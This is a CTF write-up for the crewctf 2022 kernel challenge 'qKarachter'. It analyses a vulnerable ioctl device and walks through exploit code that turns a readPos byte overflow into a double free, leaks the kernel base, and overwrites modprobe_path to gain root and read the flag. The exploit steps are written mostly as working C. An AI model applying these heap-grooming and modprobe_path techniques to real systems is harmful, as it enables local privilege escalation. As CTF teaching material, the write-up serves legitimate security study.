+++
title = 'crewctf 2022 - qKarachter'
date = '2022-04-18T00:00:00+07:00'
tags = ['ctf-writeup', 'pwn', 'kernel']
draft = false
+++

qKarachter was a kernel challenge, which provided a misc device that can be interacted with ioctl(2).

```c
typedef struct {
  unsigned int length;
  unsigned int idx;
  char* data; // ptr to char[144]
} req;


int handle_ioctl(__int64 a1, int cmd, req *arg) {
  req *req;
  req *_req;
  int result;

  mutex_lock(&mutex);  // global lock

  req = (req *)kmem_cache_alloc_trace(kmalloc_caches[4], 3264LL, 16LL);
  if (!req) {
    printk(&str_malloc_failed);
    mutex_unlock(&mutex);
    return -ENOMEM;
  }

  _req = req;
  if (copy_from_user(req, arg, 16LL)) {
    printk(&str_copy_from_user_failed);
    return -EAGAIN;
  }

  switch (cmd) {
    case 0x1338:
      result = readData(_req);
      goto _success;
    case 0x1339:
      result = delData(_req->idx);
      goto _success;
    case 0x1337:
      result = addData(_req);
      goto _success;
    default:
      printk(&str_invalid_choice);
      mutex_unlock(&mutex);
      return -EINVAL;
  }

_success:
  kfree(_req);
  mutex_unlock(&mutex);
  return result;
}
```

Data are created in `addData` with size of kmalloc-128 and the pointer to it are stored in global array `ptrArr`.

```c
typedef struct {
  char title[16];
  char* max_ptr;
  char* cur_ptr;
} info;


int addData(req *req) {
  long tmp;        // rax
  int idx;         // er12
  info *info;      // rbx
  char *data;      // rax
  char *req_data;  // rsi

  tmp = 0LL;
  while (1) {
    idx = tmp;
    if (!ptrArr[tmp]) break;
    if (++tmp == 80) {
      printk(&str_no_more_space_left);
      return -ENOMEM;
    }
  }
  info = (info *)kmem_cache_alloc_trace(kmalloc_caches[5], 3264LL, 32LL);
  data = (char *)kmem_cache_alloc_trace(kmalloc_caches[7], 3264LL, 128LL);
  if (!info || !data) {
    printk(&str_malloc_failed);
    return -ENOMEM;
  }

  req_data = req->data;

  memset(data, 0, 0x80uLL);
  memset(info->title, 0LL, 16);

  info->cur_ptr = data;
  info->max_ptr = data + 128;

  if (copy_from_user(data, req_data, 128LL) &&
      copy_from_user(info, req->data + 128, 16LL)) {
    printk(&str_copy_from_user_failed);
    return -EAGAIN;
  }

  ptrArr[idx] = info;
  readPos[idx] = 0;
  return idx;
}
```

We can are read with `readData`. The data that stored in `info` struct are only pointers, so it basically add a checks if `cur_ptr + length < max_ptr` and store how much data have been read so far in global array `readPos[idx]`, _\*Note that `readPos` data type is unsigned char\*_.

```c
int readData(req *a1) {
  long idx;                    // rax
  unsigned int length;         // rbp
  info *info;                  // rbx
  unsigned char new_read_pos;  // dl
  long result;                 // rax

  idx = a1->idx;
  length = a1->length;
  info = ptrArr[idx];

  if (!info) {
    printk(&str_no_such_item);
    return -ENOENT;
  }

  new_read_pos = length + readPos[idx];            // [1]
  if (info->max_ptr < &info->cur_ptr[length] || new_read_pos > 0x80u) {
    printk(&str_read_limit_exceed);
    return -EOVERFLOW;
  }

  readPos[idx] = new_read_pos;                     // [2]

  if (copy_to_user(a1->data, info->cur_ptr, length) ||
      copy_to_user(a1->data + 128, info, 16LL)) {
    printk(&str_copy_to_user_failed);              // [3]
    return -EAGAIN;
  }

  info->cur_ptr += length_byte;
  return 0;
}
```

… but there is a catch here. `new_read_pos` is an unsigned char, so it's possible to get an int overflow in \[1\]. Just before the data copied with `copy_to_user`, `readPos[idx]` is assigned with the `new_read_pos` in \[2\] and finally, if the `copy_to_user` failed \[3\], `info->cur_ptr` won't be modified but `readPos[idx]` are already assigned with the `new_read_pos`. Such a bug won't do much here because `readData` properly? checks for `cur_ptr + length < max_ptr`, but it'll be useful for `delData`.

In `delData`, `info` struct pointer stored in `ptrArr` and data pointer are freed then NULLed. `readPos[idx]` is also reset to zero.

```c
int delData(unsigned int idx) {
  unsigned int _idx;
  info* info;
  char* ptr;

  _idx = idx;
  info = ptrArr[idx];
  if (!info) {
    printk(&str_no_such_item);
    return -ENOENT;
  }

  ptr = &info->cur_ptr[-readPos[idx]]; // [1]
  if (ptr < info->max_ptr - 128) {     // [2]
    printk(&str_invalid_pointer);
    return -EAGAIN;
  }

  kfree(ptr);
  kfree(ptrArr[_idx]);
  readPos[_idx] = 0;
  ptrArr[_idx] = 0LL;

  return 0;
}
```

`info` struct doesn't store the begin pointer, but instead it stores `cur_ptr` which is a pointer to where the data have been read so far. So to get around that `ptr` is calculated with `cur_ptr - readPos[idx]` \[1\] which should be the same as begin pointer … if there's no side effects in `readData`.

Consider this scenario, we can freely increment `readPos[idx]` without incrementing `cur_ptr` and we can also make `readPos[idx]` int overflow and goes back to 0. Because the checks in \[2\] is only checking for `cur_ptr - readPos[idx] < max_ptr - 128` and it doesn't checks if `ptr > max_ptr`, **we can make `delData` to free the next adjacent chunk instead of the current chunk if we can make such that `cur_ptr == max_ptr` and `readPos[idx] == 0`**.

Free-ing next adjacent chunk can be turned into a double free if we can make data chunk positioned next to each other. To get that, first, we can spray some kmalloc-128 chunks. This can be achieved with spraying `msg_msg` or just go with `addData` and `delData` multiple times.

```c
    #define SPRAY 0x40

    int main(int argc, char *argv[]) {
      char *zero = malloc(sizeof(data_s));
      char *buffer = malloc(sizeof(data_s));
      uint64_t *a64 = (uint64_t *)buffer;
...
      memset(zero, 0, sizeof(data_s));
      memset(buffer, 0x41, sizeof(data_s));
...
      // make heap a little bit deterministic for later stage
      for (int i = 0; i < SPRAY; i++) add(zero);
      for (int i = 0; i < SPRAY; i++) del(i);
      for (int i = 0; i < SPRAY; i++) add(zero);
...
    }
```

Then we can select one of the index to free the next adjacent chunk.

```c
int selected_idx = 7;

// readPos[7] set to 0x80, but since the user data ptr
// is not writeable, copy_to_user would fail and curPtr
// stll stays at the beginning of the chunk
view(selected_idx, 0x80, (void *)0xdeadbeef);

// uint8 overflow, readPos[7] += 0x80 -> 0x100 -> 0
// and curPtr set to curPtr + 0x80 which should be max_ptr,
// so when delete happen it should free the next chunk
// instead of current chunk kfree((max_ptr) - readPos[7])
view(selected_idx, 0x80, buffer);

// free next adjacent chunk
del(selected_idx);
```

To know which index is adjacent next to the chunk of selected index, we need to free some chunks to get fd populated and then read the rest of `ptrArr` check if there's any kernel heap leak.

```c
  // populate fd in freed chunk
  for (int i = 0; i < selected_idx; i++)
    del(i);
...
  // free next adjacent chunk
...
  // find adjacent chunk by viewing the content, if it contains
  // a heap fd leak, then this must be the next adjacent chunk
  // !!! might fail couple of times, so restart from the very
  // begining
  int pos;
  for (pos = selected_idx + 1; pos < SPRAY; pos++) {
    view(pos, 0x80, buffer);
    // if the chunk is free fd should be populated
    // kernel heap MSB should contains 0xFF
    if (a64[8] >> 56 == 0xff) {
      break;
    }
  }
  if (pos == SPRAY) {
    puts("[!] failed to get adjacent chunk");
    exit(EXIT_FAILURE);
  }

  printf("[o] adjacent chunk 7 <--> %d\n", pos);
```

Trigger a double free, then add another data. The next allocation of kmalloc-128 should live on top of our last created chunk. I choose `subprocess_info` struct to get a leak of kernel base and `modprobe_path` pointer.

```c
// *double free*
del(pos);

memset(buffer, 0, sizeof(data_s));
int idx = add(buffer);

// populate a kmalloc-128 struct (subprocess_info)
// which should live on top of our last created chunk
socket(22, AF_INET, 0);

view(idx, 0x80, buffer);

const uintptr_t kaslr = a64[3] - 0x7e470;
const uintptr_t modprobe_path = a64[5];
printf("[o] kaslr %p\n", (void *)kaslr);
printf("[o] modprobe_path %p\n", (void *)modprobe_path);
```

Then we can overwrite fd to get an allocation on `modprobe_path` and overwrite `modprobe_path` to do modprobe_path exploit.

```c
void prepare_modprobe_path_exploit() {
  system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/user/flag\n/bin/chmod "
         "777 /home/user/flag' > /home/user/modprobe");
  system("chmod +x /home/user/modprobe");
  system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/dummy");
  system("chmod +x /home/user/dummy");
}

int main(int argc, char *argv[]) {
...
  prepare_modprobe_path_exploit();
...
  del(idx);

  // overwrite fd to modprobe_path
  memset(buffer, 0xec, sizeof(data_s));
  a64[8] = modprobe_path;
  add(buffer);
  add(buffer);

  // overwrite modprobe_path
  memset(buffer, 0, sizeof(data_s));
  strcpy(buffer, "/home/user/modprobe");
  add(buffer);

  // trigger modprobe_path
  system("/home/user/dummy");
  system("cat /home/user/flag");

  return 0;
}
```

The full exploit code can be found here, [https://gist.github.com/circleous/458f7c691b79dfbebc2930bff9d78353](https://gist.github.com/circleous/458f7c691b79dfbebc2930bff9d78353)